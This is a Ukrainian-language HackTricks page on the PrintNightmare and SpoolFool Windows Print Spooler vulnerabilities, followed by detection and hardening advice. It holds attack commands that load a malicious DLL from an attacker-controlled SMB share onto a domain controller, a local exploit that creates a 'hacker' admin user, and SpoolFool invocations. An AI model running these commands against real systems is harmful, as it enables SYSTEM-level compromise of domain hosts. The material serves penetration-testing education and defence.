# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare — це загальна назва сімейства вразливостей у службі Windows **Print Spooler**, які дозволяють **довільне виконання коду від імені SYSTEM** та, коли spooler доступний через RPC, **віддалене виконання коду (RCE) на контролерах домену та файлових серверах**. Найчастіше експлуатованими CVE є **CVE-2021-1675** (спочатку класифікована як LPE) і **CVE-2021-34527** (повний RCE). Подальші проблеми, такі як **CVE-2021-34481 (“Point & Print”)** і **CVE-2022-21999 (“SpoolFool”)**, доводять, що поверхня атаки все ще далека від повного закриття.

Якщо ви шукаєте **примусову автентифікацію / relay** через spooler, а не **RCE/LPE на основі драйверів**, перегляньте [цю іншу сторінку про зловживання printer coercion](printers-spooler-service-abuse.md). Ця сторінка зосереджена на **завантаженні драйверів / DLL від імені SYSTEM**.

---

## 1. Вразливі компоненти та CVE

| Рік | CVE | Коротка назва | Примітив | Примітки |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Виправлено в червневому CU 2021 року, але обхід реалізовано через CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` дозволяє автентифікованим користувачам завантажувати DLL драйвера з віддаленого ресурсу; після серпня 2021 року це зазвичай потребує послаблених політик Point & Print|
|2021|CVE-2021-34481|“Point & Print”|LPE|Встановлення непідписаних драйверів користувачами без прав адміністратора|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Створення довільного каталогу → DLL planting — працює після виправлень 2021 року|

Усі вони зловживають одним із **методів MS-RPRN / MS-PAR RPC** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) або довірчими відносинами всередині **Point & Print**.

## 2. Техніки експлуатації

### 2.1 Компрометація віддаленого Domain Controller (CVE-2021-34527)

Автентифікований, але **непривілейований** користувач домену може запускати довільні DLL від імені **NT AUTHORITY\SYSTEM** на віддаленому spooler (часто на DC), виконавши:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Популярні PoC включають **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) і модулі Benjamin Delpy `misc::printnightmare / lsa::addsid` у **mimikatz**.

### 2.2 Локальне підвищення привілеїв (будь-яка підтримувана Windows, 2021-2024)

Той самий API можна викликати **локально**, щоб завантажити driver із `C:\Windows\System32\spool\drivers\x64\3\` і отримати привілеї SYSTEM:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Сучасний triage на пропатчених хостах

На повністю оновленому хості публічні PoC для PrintNightmare часто не спрацьовують, оскільки Windows тепер за замовчуванням дозволяє встановлювати драйвери принтерів лише **адміністраторам** (`RestrictDriverInstallationToAdministrators=1` починаючи з 10 серпня 2021 року). Перш ніж застосовувати exploit проти цілі, спочатку перевірте, чи не скасовано в середовищі цю зміну безпеки для розгортання застарілих принтерів:
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Два найцікавіші слабкі значення зазвичай такі:

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

З Linux швидко підтвердьте, що target відкриває відповідні print RPC interfaces, перш ніж запускати PoC:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Деякі новіші загальнодоступні інструменти також надають безпечніший робочий процес **перевірки/переліку** перед надсиланням DLL:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Якщо ви отримуєте `RPC_E_ACCESS_DENIED` (`0x8001011b)` як користувач із низькими привілеями, зазвичай це означає використання налаштувань за замовчуванням після 2021 року, а не збій транспорту.

> У Windows 11 22H2+ та новіших клієнтських збірках віддалений друк за замовчуванням використовує **RPC over TCP**, а **RPC over named pipes** (`\PIPE\spoolss`) вимкнено, якщо його явно не ввімкнути повторно. Деякі старі PoC і нотатки з лабораторій досі припускають, що named pipe доступний.

### 2.4 Зловживання Package Point & Print у «пропатчених» мережах

Багато корпоративних середовищ залишалися **вразливими через політики** після оригінальних патчів 2021 року, оскільки робочі процеси helpdesk або print-server усе ще вимагали від користувачів без прав адміністратора встановлювати або оновлювати драйвери. На практиці offensive playbook виглядає так:

- Якщо security prompts повністю вимкнено, **класичний PrintNightmare з довільною DLL** усе ще є найкоротшим шляхом.
- Якщо ввімкнено `Only use Package Point and Print`, зазвичай потрібно перейти до шляху зі **signed package-aware driver**, а не просто завантажувати raw DLL.
- Дослідження 2024 року показали, що **`Package Point and Print - Approved servers` сам по собі не є жорсткою trust boundary**: якщо attacker може spoof або hijack name resolution для одного approved print server, жертв усе ще можна перенаправити на malicious server, який проходить policy checks.
- Навіть поєднання UNC hardening із примусовим RPC-over-SMB може бути нестабільним, оскільки сучасні клієнти можуть **перемикатися на RPC over TCP**.

Саме тому сучасна експлуатація в стилі PrintNightmare часто більше пов’язана зі **зловживанням enterprise printer deployment policy**, ніж із незмінним повторенням оригінального PoC 2021 року.

### 2.5 SpoolFool (CVE-2022-21999) — обхід виправлень 2021 року

Патчі Microsoft 2021 року заблокували remote driver loading, але **не посилили permissions каталогів**. SpoolFool використовує параметр `SpoolDirectory`, щоб створити довільний каталог у `C:\Windows\System32\spool\drivers\`, завантажує payload DLL і змушує spooler завантажити її:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Експлойт працює на повністю пропатчених Windows 7 → Windows 11 і Server 2012R2 → 2022 до встановлення оновлень за лютий 2022 року

---

## 3. Виявлення та hunting

* **Журнали PrintService** – увімкніть канал *Microsoft-Windows-PrintService/Operational* і відстежуйте **Event ID 316** (драйвер додано/оновлено, зазвичай містить назви DLL) як для успішних, так і для невдалих спроб. Корелюйте його з **Event ID 808/811** для виявлення підозрілих помилок завантаження модулів/драйверів spooler.
* **Sysmon** – `Event ID 7` (Image loaded) або `11/23` (File write/delete) всередині `C:\Windows\System32\spool\drivers\*`, коли батьківським процесом є **spoolsv.exe**.
* **Ланцюжок процесів** – створюйте alert щоразу, коли **spoolsv.exe** запускає `cmd.exe`, `rundll32.exe`, PowerShell або будь-який неочікуваний дочірній процес без підпису.
* **Мережева телеметрія** – неочікувані SMB-запити від **spoolsv.exe** до контрольованих attacker-ом ресурсів або нетиповий printer RPC-трафік із серверів, які не повинні працювати як print servers, є важливими сигналами для подальшого аналізу.

## 4. Зниження ризиків і hardening

1. **Patch!** – застосуйте останнє cumulative update на кожному Windows-хості, де встановлено службу Print Spooler.
2. **Вимкніть spooler там, де він не потрібен**, особливо на Domain Controllers:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Заблокуйте віддалені підключення**, водночас залишивши локальний друк доступним – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Залиште Point & Print доступним лише адміністраторам**, встановивши:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Докладні рекомендації наведено в Microsoft KB5005652
5. Якщо бізнес-вимоги змушують встановити `RestrictDriverInstallationToAdministrators=0`, вважайте всі інші політики принтерів **лише частковою mitigation**. Щонайменше надавайте перевагу **package-aware drivers**, увімкніть **Only use Package Point and Print** і обмежте **Package Point and Print - Approved servers** явним списком print servers у лісі.
6. **Не скасовуйте privacy для printer RPC** лише для виправлення непрацюючих підключень до принтерів. Середовища, у яких встановлено `RpcAuthnLevelPrivacyEnabled=0`, скасовують hardening, доданий для **CVE-2021-1678**, і зазвичай потребують додаткової уваги під час engagement.

---

## 5. Пов’язані дослідження / інструменти

* Модулі [`mimikatz printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – стандартна реалізація в Impacket із режимами `-check`, `-list` і `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper із вбудованою SMB-доставкою, підтримкою кількох цілей і режимами `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – зловживання bring-your-own-vulnerable-printer-driver через package Point & Print
* Експлойт SpoolFool і write-up
* Мікропатчі 0patch для SpoolFool та інших багів spooler

Якщо ви хочете **примусити authentication** через spooler замість завантаження драйвера, перейдіть до [зловживання printer spooler service](printers-spooler-service-abuse.md).

---

## Посилання

* Microsoft – *KB5005652: Керування новою поведінкою встановлення драйверів Point & Print за замовчуванням*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
* itm4n – *Практичний посібник із PrintNightmare у 2024 році*
<https://itm4n.github.io/printnightmare-exploitation/>
* itm4n – *PrintNightmare ще не завершився*
<https://itm4n.github.io/printnightmare-not-over/>
{{#include ../../banners/hacktricks-training.md}}
